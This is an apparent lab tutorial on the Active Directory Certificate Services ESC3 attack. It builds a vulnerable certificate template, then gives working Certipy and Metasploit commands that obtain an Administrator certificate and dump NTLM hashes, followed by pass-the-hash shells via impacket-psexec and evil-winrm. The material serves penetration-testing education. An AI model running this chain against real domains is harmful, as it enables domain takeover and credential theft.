<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/active-directory-certificate-attack/" rel="category tag">Active Directory Certificate Attack</a></span>            </div>
            <h1 class="post-title entry-title">ADCS ESC3: Enrollment Agent Template</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/" rel="bookmark"><time class="entry-date published" datetime="2025-05-03T11:34:04+00:00">May 3, 2025</time><time class="updated" datetime="2025-05-10T17:02:55+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;"><strong>Active Directory Certificate Services (ADCS)</strong> is commonly targeted in <strong>ESC3 certificate attacks</strong>, which exploit misconfigurations in <strong>certificate templates</strong> to enable serious vulnerabilities such as <strong>ADCS certificate attacks</strong> and <strong>privilege escalation</strong>. <strong>ESC3</strong>, in particular, poses a significant threat when combined with a misconfigured <strong>Certificate Request Agent (CRA)</strong> template. This flaw allows attackers to request certificates for high-privileged users, like domain admins, giving them unauthorized access and opening the door for further exploitation.</span></p>
<p><span style="color: #000000;">In PART 2 of this ADCS series, we covered an overview of Active Directory Certificate Services and demonstrated the <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/ad-certificate-exploitation-esc2/">ESC2 escalation technique</a></strong>.</span> In this post, we’ll dive into the <strong data-start="888" data-end="928">AD CS ESC3 Enrollment Agent Template</strong>—an escalation method that exploits a misconfigured Certificate Request Agent EKU, also known as the “Enrollment Agent,” allowing a user to request a certificate on behalf of another user, such as a Domain Admin.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;"><strong>What is ESC3?</strong></span></li>
<li><span style="color: #000000;"><strong>ADCS and Certificate Templates Risks</strong></span></li>
<li><span style="color: #000000;"><strong>Certificate Request Agent EKU</strong></span></li>
<li><span style="color: #000000;"><strong>Prerequisites</strong></span></li>
</ul>
<p><span style="color: #000000;"><strong>Lab Setup</strong></span></p>
<p><span style="color: #000000;"><strong>Enumeration and exploitation</strong></span></p>
<ul>
<li><span style="color: #000000;">ESC3 Attack Using Certipy</span></li>
</ul>
<p><span style="color: #000000;"><strong>Post Exploitation </strong></span></p>
<ul>
<li><span style="color: #000000;">Lateral Movement &amp; Privilege Escalation using impacket-psexec</span></li>
<li><span style="color: #000000;">ESC3 Attack Using Metasploit</span></li>
<li><span style="color: #000000;">Lateral Movement &amp; Privilege Escalation using Evil-Winrm</span></li>
</ul>
<p><span style="color: #000000;"><strong>Mitigation </strong></span></p>
<h3><span style="color: #800000;">What is ESC3?</span></h3>
<p><span style="color: #000000;"><strong>ESC3 using Certificate Request Agent</strong> allows designated users to request certificates on behalf of other users, computers, or services within an enterprise Public Key Infrastructure (PKI) environment. This is commonly used in scenarios where end-users cannot request certificates themselves due to lack of access or permissions.</span></p>
<p><span style="color: #000000;">Requirements to Make ESC3 Attack Possible:</span></p>
<ul>
<li><span style="color: #000000;">Certificate template allows “enrollment on behalf of”</span></li>
<li><span style="color: #000000;">Attacker has a valid Certificate Request Agent certificate</span></li>
<li><span style="color: #000000;">Attacker has Enroll permissions on a vulnerable certificate template</span></li>
<li><span style="color: #000000;">No strong restrictions on who can be impersonated</span></li>
<li><span style="color: #000000;">Overly broad assignment of Certificate Request Agent role</span></li>
</ul>
<h3><span style="color: #800000;">ADCS and Certificate Templates Risks</span></h3>
<p><span style="color: #000000;">Active Directory Certificate Services (ADCS) and certificate templates pose significant risks if misconfigured, potentially enabling privilege escalation, lateral movement, or full domain compromise. Certificate attacks like <strong>ESC3</strong> allow attackers to modify templates to issue certificates for privileged impersonation, effectively bypassing authentication and enabling stealthy, persistent access.</span></p>
<p><span style="color: #000000;"><strong>ADCS </strong>issues certificates in Active Directory using templates that define permissions and usage. Poorly secured templates are prime targets for attacks like</span></p>
<p><span style="color: #000000;"><strong>ESC1</strong> (abusing dangerous permissions like ENROLL and Client Authentication),</span></p>
<p><span style="color: #000000;"><strong>ESC2</strong> (exploiting misconfigured issuance policies), and</span></p>
<p><span style="color: #000000;"><strong>ESC3</strong> (using <strong>Certificate Request Agent</strong> template to impersonate privileged accounts).</span></p>
<p><span style="color: #000000;">If not tightly controlled, ADCS can become a powerful tool for lateral movement and privilege escalation in a domain.</span></p>
<p><span style="color: #000000;">The vulnerability conditions for ESC1, ESC2, and ESC3 certificate templates are as follows</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpnBhodh44aiEaQB9Cv_CWE-aXMPy9yccaBDdnrLAyCMqSxFQYVVPdQC8MzO5mQu_RtwH-j7G3M_flLKemCsz9oqeTjfndx8NVeeJWENYdVxtsd9kwrgMNm0QjRlyF3wCWwQIf88NNouaWa-eLcJQ5nRDLQC0I8f8wu6NoKXzWIcNVu-o2sy-QJ9yWKOcq/s16000/0.PNG"/></span></p>
<p><span style="color: #000000;">In the case of <strong>ESC3</strong>, we will walk through how an attacker can abuse a misconfigured <strong>Certificate Request Agent</strong> template to request certificates on behalf of privileged users, enabling impersonation and unauthorized access through certificate-based authentication.</span></p>
<h3><span style="color: #800000;">Certificate Request Agent EKU</span></h3>
<p><span style="color: #000000;">A <strong>Certificate Request Agent</strong> is a <strong>delegated user or service</strong> that is authorized to <strong>request digital certificates on behalf of other users or devices</strong> in an Active Directory environment, typically through a special certificate template.</span></p>
<p><span style="color: #000000;">In Active Directory Certificate Services (ADCS), a <strong>Certificate Request Agent</strong> is a trusted account (typically a user or service account) that is <strong>authorized to request certificates on behalf of other users or computers</strong>.</span></p>
<p><span style="color: #000000;">This is part of a <strong>delegated enrollment model</strong>, often used in environments where:</span></p>
<ul>
<li><span style="color: #000000;">End-users can’t request their own certificates (e.g., smartcards)</span></li>
<li><span style="color: #000000;">A centralized system or helpdesk issues certificates for users</span></li>
<li><span style="color: #000000;">Automation systems handle identity provisioning</span></li>
</ul>
<h5><span style="color: #000000;"><strong>How it works:</strong></span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQzVq6xdtbV1id-ft2UUW0m2veIGsrM-oOJAdK-mmAUhpHOwAtpXZ4HAmqdAzyGOgx5NZMq7j0LvCZL26eXtjhsWjOPuuhZP5v4CdNFokUXW8vvLLom60CHoKpJK50vTMJi2O6BIsp8__L_GA3U1ZWDy9_Tg074iCdoo17EAp9AJzLJXkaphqPjUHDvIwq/s16000/1.1.PNG"/></span></p>
<p><span style="color: #000000;"><em>Note: </em><em>Extended Key Usage (EKU) is a certificate field that specifies its intended purposes like email encryption, user authentication, or secure web access each represented by a unique Object Identifier (OID).</em></span></p>
<h5><span style="color: #000000;"><strong>The Security Risk, When Misused:</strong></span></h5>
<p><span style="color: #000000;">The Certificate Request Agent EKU, though useful for delegated enrollment, poses a serious security threat if the certificate template includes it without requiring approval, is accessible to non-privileged users, and lacks restrictions on which identities can be impersonated.</span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Prerequisite</span> </span></h3>
<ul>
<li><span style="color: #000000;">Windows Server 2019 as Active Directory that supports PKINIT</span></li>
<li><span style="color: #000000;">Domain must have Active Directory Certificate Services and Certificate Authority configured.</span></li>
<li><span style="color: #000000;">Kali Linux packed with tools</span></li>
<li><span style="color: #000000;">Tools: Evil-winrm, Impacket, certipy-ad, Metasploit</span></li>
</ul>
<h3><span style="color: #800000;">Lab setup</span></h3>
<p><span style="color: #000000;">Starting by launching the Certificate Template Console:</span></p>
<p><span style="color: #000000;">Run certtmpl.msc on the Domain Controller, then navigate to <strong>Certificate Templates → Manage</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSAzZbunG7WzLgfgfSUYa4wodIJZ4unAWfxfgeIfFWAdhKsW-mOP48Itw7PWcJQLf_RcyIe2QdAKXUoCTV9fXg32B8hvK4ommFryk76DbTPa9OrI8V7Y6XACRDmdA4dnF2dn3wvowB4kx-YxaUShXfcYQ-BYO51poE1IDUx9Gy8SjYk0-Na7KKFT27SUsf/s16000/1.png"/></span></p>
<h4><span style="color: #000000;">Duplicate the “Certificate Template” Template</span></h4>
<ul>
<li><span style="color: #000000;">Scroll down and find the <strong>“Code Signing”</strong> template.</span></li>
<li><span style="color: #000000;">Right-click it → Click <strong>Duplicate Template</strong>.</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgaDNQrTKx0PHrM3pPPICh4fskNTrGAryFFm7rjztzwrGCar_VSYmVCNi2s_Nl9Y9v5lHlCWIiEhfMn3S33SCa7vbgLfANcoVp1XzjYxNkPB6gEmWOg51CK7mCtN_hloTCUTyjsMOXbcAYPKzZa-yzZ2VHbYEzyw4Fq_jg_rGnvXUZHbXjCKiNSOYs_e8Ya/s16000/2.png"/></span></p>
<h4><span style="color: #000000;">Configure the New Template</span></h4>
<p><span style="color: #000000;">A new window will appear with multiple tabs, go through them one by one.</span></p>
<p><span style="color: #000000;">General Tab:</span></p>
<ul>
<li><span style="color: #000000;">Set the <strong>Template display name</strong> to: ESC3</span></li>
<li><span style="color: #000000;">(Optional) Adjust the <strong>Validity Period</strong> — the default of 1 year is typically sufficient.</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiZG-u04WmFDgGAmK-AhIAF2C5Iuw20iqQXRVY78aaxDhV6IMGmEaJ2HqD1QEDv3GayUIWakadd5gRpAhn3BlEQ8t-poor4tdG4dw5wV_-iK66FnfC_MIGUnVd4cyMSltLeTWu7WjeygfUr9JtcEiVp11Nf08CTWQybGijjCcdE7M_tInYlkCQxMmFdzQWF/s16000/3.png"/></span></p>
<p><span style="color: #000000;"><em>This name will show up when requesting the certificate</em></span></p>
<h4><span style="color: #000000;">Configure the Subject Name Tab</span></h4>
<ul>
<li><span style="color: #000000;">Select: <strong>Build from this Active Directory information</strong></span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0ui2kmInTRJd1uDz-RSf9MSX69dJHWDJEMCNuaZij7YnDgcMhRJCMpl58-uAzyQHjPvc4-vo5CGUXR5yLjsqS4ZM6Dn9hTp0Vjbh3t6mSrSnfNGCoPSoWj3qrwYK9vy-XqkpxUft__UPrEYFXexP7Za1e8BIqrxrhXpjikO7m-IHz2l4F-gBcRKj0I0N7/s16000/4.png"/></span></p>
<p><span style="color: #000000;"><em>This setting prevents attackers from supplying their own identity (e.g., CN=Administrator)</em></span></p>
<h4><span style="color: #000000;">Configure the Security Tab</span></h4>
<ul>
<li><span style="color: #000000;">Click <strong>Add</strong> → Type Domain Users → Click OK</span></li>
<li><span style="color: #000000;">Select Domain Users</span></li>
<li><span style="color: #000000;">Check →  Enroll</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEggRrAD7J8vE22C0ZgRvpqmLMUOB59zaK2pz118qxLzdBPkFAqWulKl2dlYysxAAvNXarN8q9ewKOM1iDAX9Dce06nULoyaMBCWQUOxs_u6zEm2CZlhKtvbV-VOxtFC3bJV9y5MwcvsDzv0FWdIvpyhzCrFjnWFgrSuo9loLpJl_4tRMT2JNOyrAwPBIMim/s16000/5.png"/></span></p>
<h4><span style="color: #000000;">Configure the Extensions Tab</span></h4>
<ul>
<li><span style="color: #000000;">Go to the <strong>Extensions</strong> tab</span></li>
<li><span style="color: #000000;">Select <strong>Application Policies</strong> → Click <strong>Edit</strong></span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2m4yyv6vvfg8e8oVWnk1r2Ky8hQdnXtdhULCyFlsnI3W7j4RCixDOfbWlb3wir5w3CvgrIRJFkKsgE4jI9_bmMzXNCAOGQrEcDdFzevWUQVdvClLg7Q9rwG5GRsf-yQmclOIhdzWd4KyEShln5aUi4hmtlT8jZ75uhGnGzLdaR54GTXbz3n2QsB255x2m/s16000/6.png"/></span></p>
<h5><strong><span style="color: #000000;">Inside the Edit Window:</span></strong></h5>
<ul>
<li><span style="color: #000000;">Select: <strong>Code Signing</strong> → Click <strong>Remove</strong></span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2XHlP9ZPt1STEOXncrvaoKgHKquT5JSoY-6SQWOUt2Qsp18WQoz_bxgK_-gwJdOxBMaE33Zg0d8XilivWigHfqU8p_KxixWa5Jo72Cha293sDQMDXfPDx2a12DHSMY4B5823hE5wlrqnWxcuRTRdZ4LqRmvBqiSyviAXaWSTl6s670Psdlkfr3Nyu1Vd-/s16000/7.png"/></span></p>
<ul>
<li><span style="color: #000000;">Click <strong>Add</strong><strong> and then </strong>Select <strong>Certificate request Agent</strong></span></li>
<li><span style="color: #000000;">And Click <strong>OK</strong></span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgfLJR-TNDQ9On5sr9ptmd2ht7ko2QtoxWchS1zv9ZAH8o0yLabsn3-g-Po4g9VvGoxoYSeYn2OsjTC0GIvo01wbSbgs5aCHPnMzjzuS3RzpGuHcbx5MaOVDO7CzOKOjsO6l96D-4GpKBkMpnzcwm49kmxuHKrMkYa4i7fYzBf-ZhsotU6qSbKZA2IoJYxV/s16000/8.png"/></span></p>
<h4><span style="color: #000000;">Confirm Issuance Requirements</span></h4>
<p><span style="color: #000000;">Go back to the Certificate Authority (certsrv.msc) window. Right-click Certificate Templates → Click New → Certificate Template to Issue.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhgKDds8FfiGV6pw17OaQADZGfRfM7N0n3LN_D1r_imaufbnn0gUWSR4Pagy_Yptz7TE9fB5C5E6xmP8luUKZAYK0ySLeUFcD7U-OKjiEcHO5IHwhhQmRqZvmKjx8qT1aw4wNxEiycbL7EROZOqhWDMJ3CpM01t2nBCjpPzAaf3pGxsvmbPolcd_xhxWhgU/s16000/9.png"/></span></p>
<p><span style="color: #000000;">Find Vulnerable Template in the list and select it, in our case we created it as ESC3.</span></p>
<p><span style="color: #000000;">Click OK to publish it</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiZACGny-54MH-K5IZkmwoC1NqlFSPh7xsfMuuPVVMt2KYcTBmDa7S7Utf5edMvisoc6WCYWUGDcDucuUQ_oHECy9bGBIChKiQrMo1eF_ak8K7NlFMipP-5YOM6dRtx4uf9NkvraGHFfmFTQa0pOBUqUVlusJqkL5X5pcXGENjB1Jb2iAxIj4b5d5hTC3uy/s16000/10.png"/></span></p>
<h4><span style="color: #000000;">Save the Template</span></h4>
<ul>
<li><span style="color: #000000;">Click <strong>OK</strong> to save and close</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKkh7-jmqHUIfphTzpWs4x7-2SJV68vz_CfciNi2OiRDbT6JoCxzY0RSPf6YZQ_9hAwyR-TUCPeFfazKKuoO8NPpLrqYND_6e3KcToQhpVx9lva8lOD8eZbrhrgkZTnULy0AYMVGeBALbSjZb93vNvYn8tNXqJpwSwCXiJ-aqq6zPIZM70RjUX1ZcuL-4E/s16000/11.png"/></span></p>
<p><span style="color: #000000;">We can see our <strong>template</strong> is now created!</span></p>
<h3><span style="color: #800000;">Enumeration &amp; Exploitation</span></h3>
<h4><span style="color: #000000;">ESC3 Attack Using Certipy</span></h4>
<ul>
<li><strong><span style="color: #000000;">Enumeration for Vulnerable Templates</span></strong></li>
</ul>
<p><span style="color: #000000;">Use Certipy from the attacker machine to enumerate AD CS configuration and vulnerable templates, specifying <strong>raj</strong> as the user in this case.</span></p>
<p><span style="color: #000000;">Let’s fire the command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad find -u 'raj@ignite.local' -p Password@1 -dc-ip 192.168.1.48 -vulnerable -enabled</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj6NdcefWT8lTihT-20Cb9MDaOJDh_KHePCsHbKuOMFskwGLZWYGLuOQZtKIiLTrcktixoLrpSpJpUzXABK-lgVa1KbQ8M073glmZl7wDCwPitAbyniq8atA1vprKwJKdN896Yt65ilkYhI899LeRcqlxxUFei-LjX0dL4OMPoM1hnELf8D39Z4QuHYZycS/s16000/12.png"/></span></p>
<p><span style="color: #000000;">Identify a certificate template that contains the Certificate Request Agent EKU, allows on-behalf-of enrollment, and is vulnerable to ESC3 exploitation in the file saved as 20250112131824_Certipy.txt</span></p>
<p><span style="color: #000000;">Use your preferred text editor to view the saved file in this case, we’re using cat to read its contents.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjd3rTVtCi4eXchmQ-BobMLbDmzaVzqSHC_c0bS4O-SlLNONfQ4WLpkVR41w2pqdi5d54OCzI6AL2FLqUYd0ZQhyp4NXFUeQ4oDf1ab9juhlVdXu0AOAGvbI32aHyTlIoPRkA4C53P64jhWChBDmlG7ZFsogYhJAYE2OR0Zb1U-fPgZ-tP40cl94bdZyE8U/s16000/13.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgOnvWe_CuhPIO0JfbBac4_pDv2Xhn1jd4MUx7J9lE8cLEmwMwQOqNof3MSaVwo1tUTo6CMb28tYNhCTXazSb1gHLcpl7lgpIu3Mojsfb4wcGVTh80y8U2hnH0memrD7lAWqoHW56OBNJNzoqkxALcSu_BGCxp2Wp_1YmDAFvZoRV3CEZg6kmAWSdz0P7Fz/s16000/14.png"/></span></p>
<ul>
<li><span style="color: #000000;"><strong>Request a Certificate as Administrator</strong></span></li>
</ul>
<p><span style="color: #000000;">Use the vulnerable template to request a certificate for your own user (eg, raj)</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad req -u 'raj@ignite.local' -p 'Password@1' -dc-ip 192.168.1.48 -ca ignite-DC-CA -target 'dc.ignite.local' -template 'ESC3'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgBPJcWDVndxym5x4-UMbYAkFzIRvLQAjVJBuyRFk2zZwH1wsG2RFdIwdTQIgNmdntcNap6uk9iKZ1t6KDGUuHI8_0QOOS15LG1GTQuGaNkZRJ_LOiKaQYvtD_9gEa1aEYu1UVJFA6mrvyuuNnUdl8Ki88lJgh9GN4XYWNk9IsRiFFEPQTQp4RA5th89w50/s16000/15.png"/></span></p>
<p><span style="color: #000000;">If successful, Certipy generates and saves a .pfx certificate file in our case, it’s <strong>raj.pfx</strong>!</span></p>
<p><span style="color: #000000;">We’re directing Certipy to log in as raj, use the ‘User’ certificate template to request a cert on behalf of Administrator, and save the resulting certificate as <strong>raj.pfx</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad req -u ‘raj@ignite.local’ -p 'Password@1' -dc-ip 192.168.1.48 -ca ignite-DC-CA -target ‘dc.ignite.local’ -template 'User' -on-behalf-of administrator -pfx raj.pfx</pre>
<p><span style="color: #000000;">If successful, this results in a <strong>valid certificate for </strong><strong>Administrator</strong> without needing their credentials.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgMUB5WNZsleUE8K_mDyKTtKwtBs9KxUnZvgkXlNbf8gqhBWGJ-AD1BYw3rDXLPEjqpS52usSJdVvK4BI7ufBRQ4B6aI2KI9kwH7HofJ-9qcHOiUdIK5zWMrZxL6Ak3zzjs5qwsP20WqfBI9-uTnpJnjKsWCHQov4UihJGUiaro2Sd3uPSx5vNAbKWukprj/s16000/16.png"/></span></p>
<p><span style="color: #000000;"><em>Note: The </em><em>-on-behalf-of administrator</em><em> flag is the key impersonation step, it tells the CA to issue a certificate for Administrator instead of the requesting user.</em></span></p>
<ul>
<li><strong>Use the Certificate</strong></li>
</ul>
<p><span style="color: #000000;">Once authenticated as <strong>Administrator</strong>, you can proceed to dump <strong>NTLM hashes</strong> from the <strong>Domain Controller</strong>.</span></p>
<p><span style="color: #000000;">To achieve, fire the command as</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad auth -pfx administrator.pfx</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjW2kv4gZhC_5SaQ9GUh1DfifnW9ksutrlW8FKmLrK0fdq9L1VIP-vxSfD61n6JBi8bq_sCS_ukcKRStiXN7mxIBCJR5wUiVc0ZuIPKv-KMim79PEoL87KZcBAMHmnb0dBCoNeYieEeevyy5-qPmCH4nH6osnjTI4t5j-uN_oaukdHMPn-rhlTRATzH4BhY/s16000/17.png"/></span></p>
<h3><span style="color: #800000;">Post Exploitation</span></h3>
<h4><span style="color: #000000;">Lateral Movement &amp; Privilege Escalation using impacket-psexec </span></h4>
<p><span style="color: #000000;">After that, perform <strong>lateral movement</strong> using <strong>Pass-the-Hash (PTH)</strong> attacks.</span></p>
<p><span style="color: #000000;">For this, use the powerful <strong>Impacket</strong> toolkit with a command like:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32196b56ffe6f45e294117b91a83bf38 administrator@192.168.1.48</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj-73tOUtW8L-8Q_zdVzcDtx8PMgnP_HUT-1XvCu8K363ecX0KEmZ3pco5suDHg44oYPp5VGdQ74GwgPCsV6jaSGGArMuV4IGFPGVYJak7bZFv7ojMwKUb_ybKZ9_mzz5k_c3Q8kqhi76u_x0OefCO9hFnkZ_Q5XmZCkWI_wRrXtCArbc-WW5Gzm_rus9ue/s16000/18.png"/></span></p>
<p><span style="color: #000000;">This allows you to access resources on other systems without needing the actual password just the hash.</span></p>
<h4><span style="color: #000000;">ESC3 Attack Using Metasploit</span></h4>
<p><span style="color: #000000;">Use Metasploit’s LDAP module to find vulnerable AD CS templates (like ESC3); if impersonation is possible, exploit it using the icpr_cert module, which requests a certificate via RPC and saves a .pfx file for future authentication.</span></p>
<p><span style="color: #000000;">In this case, the AD CS server issued a cert for <strong>raj@ignite.local</strong>, saved as a .pfx at /root/.msf4/loot/…, ready for PKINIT-based auth.</span></p>
<h5><span style="color: #000000;"><strong>Load the Certificate Request Module </strong></span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/dcerpc/icpr_cert</pre>
<h5><span style="color: #000000;"><strong>Set the Target and Parameters </strong></span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set RHOSTS 192.168.1.48
set CA ignite-DC-CA
set CERT_TEMPLATE ESC3
set SMBDomain ignite.local
set SMBPass Password@1
set SMBUser raj
run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi2w1Co9XAmf24KxTxxphim_bkZ4wz_Av6peEV5KExecW8xNbZ2U1XFc3acww_zK50lb44d-yv62uTNoBSb-hrdvAwNVglJj5n75mWeZZkF3EB9iS5caoRciFy4lz46T0j3DAaEs-9WYz8JRI9h_KhPpPtGvXOZ5fqJAb2YuaMnENLjW9IkTKM15f2TOyJt/s16000/19.png"/></span></p>
<p><span style="color: #000000;">We can verify that the .pfx file is valid and stored locally and it can now be used to authenticate as <strong>raj</strong> or impersonate another user, depending on the template’s permissions.</span></p>
<p><span style="color: #000000;">In this case, we listed the <strong>loot</strong> directory and renamed the obtained certificate to <strong>administrator.pfx</strong> for clarity</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi9VG2v7QTb9YBEk5okecH_EkqJ9gouUshgtE4laIa7iyVPDLa1_OY5r04pRZ8ajGKU4DWKTwyEQ8vqqdAyLvRrvlDQ25vMJRqN_hAIdk0dX3DTg9aVfZIbsZoiFT4-kPt-GqsTc8glMKzQh98SAs9JozBthNTBeZdEgGGMFryZ-vOFPAff6Z7wb0lHx9hV/s16000/20.png"/></span></p>
<p><span style="color: #000000;">We can reuse the Metasploit module admin/dcerpc/icpr_cert to impersonate the <strong>Administrator</strong> account and obtain a valid <strong>.pfx</strong> certificate issued in their name.</span></p>
<p><span style="color: #000000;">By setting <strong>ON_BEHALF_OF</strong>, a low-privileged user can request a certificate on behalf of another user in this case, <strong>Administrator</strong>.</span></p>
<p><span style="color: #000000;"><em>Note: It works <strong>only if</strong> the certificate template allows it (SubjectAltName from requester &amp; no Manager Approval or ENROLLEE_SUPPLIES_SUBJECT restrictions).</em></span></p>
<p><span style="color: #000000;">We selected the ‘User’ certificate template, which is likely enrollable by the current user.</span></p>
<h5><span style="color: #000000;"><strong>Load the Certificate Request Module </strong></span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/dcerpc/icpr_cert
set ON_BEHALF_OF Administrator
set PFX /root/.msf4/loot/administrator
set CERT_TEMPLATE User
run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9KpQkf73apJS-QNy1i3X8QWDUkSTKIJ8PY3iifDK3tugEgnm7a9kA78ihQYaMOYuo86oMIlmTRvqrn-_vRNCZYTiee8Xdhk-GIg0CtEJQ3n6gPOwNi-ca7gE7drpWf0GSA9K6z1sAQKEyMD-1gA05LsqpdMDZaxWedHVZlWO_Al0TbrHyDZkuLsWz-VhH/s16000/21.png"/></span></p>
<p><span style="color: #000000;">We successfully obtained a certificate as Administrator, confirming the template’s vulnerability to ESC3, and the resulting .pfx file now serves as Administrator’s private key and certificate, enabling Kerberos authentication as that user using Certipy or similar tools.</span></p>
<p><span style="color: #000000;">In this case, we use the <strong>.pfx</strong> file to authenticate as <strong>Administrator</strong> and obtain a <strong>Kerberos TGT</strong> via a Metasploit module which can later be used for <strong>Pass-the-Ticket (PTT)</strong> attacks..</span></p>
<p><strong><span style="color: #000000;">Launch Metasploit: msfconsole</span></strong></p>
<h5><strong><span style="color: #000000;">Load the Module:</span></strong></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/kerberos/get_ticket
set action GET_HASH
set cert_file /root/.msf4/loot/20250112133551_default_192.168.1.48_windows.ad.cs_685006.pfx
set rhosts 192.168.1.48
run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUKi1O9_pDg42I7YCk9Oc03K76Qi8X9DRsNjba4VOaDAhuQlQoUyspHy-7fdIYMb3lumebqkA4GtTWkKtNYvNqWEkwN_OC-lHBl0Ede6pIyfxHVDQWh9puYexBUTxW0q3Ih706mevL2Q8U5eDyQrMTyo6Xw45md8EevkzEB7EIRSf5Jw5L9rXXSuZBNZTE/s16000/22.png"/></span></p>
<p><span style="color: #000000;">If successful, NTLM hash is dumped</span></p>
<h4><span style="color: #000000;">Lateral Movement &amp; Privilege Escalation using Evil-Winrm</span></h4>
<p><span style="color: #000000;">Use <strong>Evil-WinRM</strong> to get a shell as <strong>Administrator</strong> via certificate-based authentication.</span><br/>
<span style="color: #000000;">Launch it with the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.1.48 -u administrator -H 32196b56ffe6f45e294117b91a83bf38</pre>
